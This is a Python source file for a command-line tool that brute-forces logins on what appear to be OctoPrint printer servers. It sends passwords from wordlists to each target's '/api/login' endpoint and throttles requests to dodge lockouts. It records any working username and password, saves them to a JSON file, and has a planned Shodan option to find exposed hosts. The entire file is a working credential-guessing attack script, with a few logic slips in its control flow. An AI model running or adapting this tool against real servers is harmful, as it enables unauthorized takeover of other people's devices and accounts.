#! /usr/bin/python3

from queue import Queue

import requests
import sys
import threading
import time
import argparse
import json
import textwrap
import banner

parser = argparse.ArgumentParser(epilog=textwrap.dedent(
    '''Example: python3 lnkbomb.py -l admin -P rockyou.txt -u http://192.168.1.55 -v
        Example: python3 lnkbomb.py -L users.txt -p Password123 -U urls.txt -v
'''))
parser.add_argument('-v', '--verbose', help="will print loaded passwords", action='store_true')

usrgroup = parser.add_mutually_exclusive_group(required=True)
usrgroup.add_argument('-l', '--user', help="provide a single username")
usrgroup.add_argument('-L', '--usrlist', help="provide list of usernames")

pwdgroup = parser.add_mutually_exclusive_group(required=True)
pwdgroup.add_argument('-P', '--pwdlist', help="provide the list of passwords")
pwdgroup.add_argument('-p', '--password', help="provide a single password")

urlgroup = parser.add_mutually_exclusive_group(required=True)
urlgroup.add_argument('-u', '--url', help="provide a single url")
urlgroup.add_argument('-U', '--urllist', help="provide a list of urls")

# TODO
parser.add_argument('-s', '--shodan', help="find online octiprint hosts", action='store_true')

args = parser.parse_args()
# print(args)

shodan_api = 'api_key_here'
login = '/api/login'
saved = 'validCreds.json'
wordlist = args.pwdlist
newFound = 0

found = {}


class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    LINE = '----------------------------------------'
    ACTION = BOLD + OKCYAN + '[+] ' + ENDC
    INFO = BOLD + OKGREEN + '[^] ' + ENDC
    MAIN = BOLD + OKBLUE + '[*] ' + ENDC
    CRIT = BOLD + FAIL + '[!] ' + ENDC


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url + login
        self.found = False
        if args.pwdlist is not None:
            self.wordlist = args.pwdlist
            self.read_words()
        else:
            self.wordlist = args.password

    def add_word(self, word):
        self.words = Queue()
        self.words.put(word)

    def read_words(self):
        with open(self.wordlist) as f:
            raw_words = f.read()
            self.words = Queue()
            for word in raw_words.split():
                self.words.put(word)

    def bruteforce(self):
        for _ in range(5):
            t = threading.Thread(target=self.bruter, daemon=False)
            t.start()
            # threading not currently being utilized
            t.join()

    def bruter(self):
        # initialize session
        session = requests.Session()
        resp0 = session.get(self.url)
        params = dict()
        params['user'] = self.username
        global newFound

        while not self.words.empty() and self.found is False:
            time.sleep(.05)  # used to prevent any type of account lockouts (test lower timeouts)
            passwd = self.words.get()

            if args.verbose:
                print(f'For {self.url} trying {self.username}:{passwd:<10} ')
            params['pass'] = passwd
            resp1 = session.post(self.url, data=params)

            if resp1.status_code == 200:
                newFound += 1
                self.found = True
                print(f'\n{colors.CRIT}{colors.WARNING}Valid user found{colors.ENDC}')
                print(f'Username is {colors.FAIL}{self.username}{colors.ENDC}')
                print(f'Password is {colors.FAIL}{passwd}{colors.ENDC}\n')
                found[self.url] = (self.username, passwd)


def load_pwds():
    global found
    try:
        with open(saved) as json_file:
            found = json.load(json_file)
    except OSError:
        return

def write_pwds():
    if found:
        with open(saved, "w") as outfile:
            json.dump(found, outfile)

def show_found():
    if found:
        print(f'{colors.ACTION}{colors.HEADER}Found {len(found)} valid credentials{colors.ENDC}')
        print(colors.LINE)
        for cred in found:
            print(f'URL:{cred} Username:{colors.FAIL}{colors.BOLD}{found[cred][0]}{colors.ENDC} Password:{colors.FAIL}{colors.BOLD}{found[cred][1]}{colors.ENDC}')
        print(f'\nValid credentials saved to {saved}')
        print('\n\n\n')
    else:
        print(f'\n{colors.ACTION}{colors.HEADER}No valid credentials found{colors.ENDC}')


# print(f'\n{colors.ACTION}{colors.HEADER}Attempted {attempted} passwords on {len(sites)} sites{colors.ENDC}')

if __name__ == '__main__':

    banner.print_banner()
    print(f'\n\n{colors.ACTION}{colors.HEADER}Loaded settings{colors.ENDC}')
    print(colors.LINE)
    if args.urllist is not None:
        urls = open(args.urllist, 'r')
        sites = urls.read().splitlines()
        print(
            f'{colors.INFO}{colors.HEADER}Url list provided with {colors.OKGREEN}{colors.BOLD}{len(sites)}{colors.ENDC}{colors.HEADER} urls{colors.ENDC}')
    else:
        print(f'{colors.INFO}{colors.HEADER}Single url provided{colors.ENDC}')
    if args.usrlist is not None:
        userList = open(args.usrlist, 'r')
        users = userList.read().splitlines()
        print(
            f'{colors.INFO}{colors.HEADER}User list provided with {colors.OKGREEN}{len(users)}{colors.HEADER} users{colors.ENDC}')
    else:
        print(f'{colors.INFO}{colors.HEADER}Single user provied{colors.ENDC}')

    if args.pwdlist is not None:
        pwdList = open(args.pwdlist, 'r')
        pwds = pwdList.read().splitlines()
        print(
            f'{colors.INFO}{colors.HEADER}Password list provided with {colors.OKGREEN}{len(pwds)}{colors.HEADER} passwords{colors.ENDC}')
    else:
        print(f'{colors.INFO}{colors.HEADER}Single password provided{colors.ENDC}')

    load_pwds()

    if found is not None:
        print(f'{colors.INFO}{colors.OKGREEN}{len(found)}{colors.HEADER} valid passwords loaded{colors.ENDC}\n')

    if args.urllist is not None:
        for url in sites:
            # print(f'Currently brute forcing {colors.OKGREEN}{colors.BOLD}{url}{colors.ENDC}')
            if args.usrlist is None:
                if args.verbose:
                    print('\n')
                print(f'{colors.ACTION}{colors.HEADER}Attempting brute forcing {colors.OKCYAN}{args.user}{colors.ENDC}')
                if args.verbose:
                    print(colors.LINE)  # print('no list of username provided')
                b = Bruter(args.user, url)
                if args.pwdlist:
                    b.read_words()
                if args.password:
                    b.add_word(args.password)
                b.bruteforce()

            if args.usrlist is not None:
                # print(f'user list provided for {url}')
                userList = open(args.usrlist, 'r')
                users = userList.read().splitlines()

                for user in users:
                    # print(url)
                    b = Bruter(user, url)
                    b.read_words()
                    b.bruteforce()

    if args.url is not None:
        if args.usrlist is None:
            if args.verbose:
                print('\n')
            print(f'{colors.ACTION}{colors.HEADER}Attempting brute forcing {colors.OKCYAN}{args.user}{colors.ENDC}')
            if args.verbose:
                print(colors.LINE)  # print('no list of username provided')
            b = Bruter(args.user, args.url)
            if args.pwdlist:
                b.read_words()
            if args.password:
                b.add_word(args.password)
            b.bruteforce()

            if args.usrlist is not None:
                # print(f'user list provided for {url}')
                userList = open(args.usrlist, 'r')
                users = userList.read().splitlines()

                for user in users:
                    # print(url)
                    b = Bruter(user, args.url)
                    b.read_words()
                    b.bruteforce()

        show_found()
        write_pwds()
